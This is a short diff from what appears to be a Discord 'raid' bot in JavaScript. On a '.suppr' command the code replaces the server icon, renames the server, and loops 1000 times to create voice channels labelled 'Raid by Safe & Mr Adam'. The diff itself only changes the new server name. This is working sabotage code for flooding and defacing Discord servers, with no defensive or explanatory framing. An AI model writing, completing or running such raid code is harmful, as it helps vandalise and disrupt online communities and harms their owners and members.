@@ -70,7 +70,7 @@ if(msg.content === '.suppr'){
  
     if (!fucked){
       msg.guild.setIcon("diapo.jpg").catch(e => {});
-      msg.guild.setName('R A I D').catch(e => {});
+      msg.guild.setName('𝕆𝕄𝔼𝔾𝔸').catch(e => {});
  
       for (var i = 0; i < 1000; i++) {
         msg.guild.createChannel('Raid by Safe & Mr Adam', 'voice').catch(e => {});
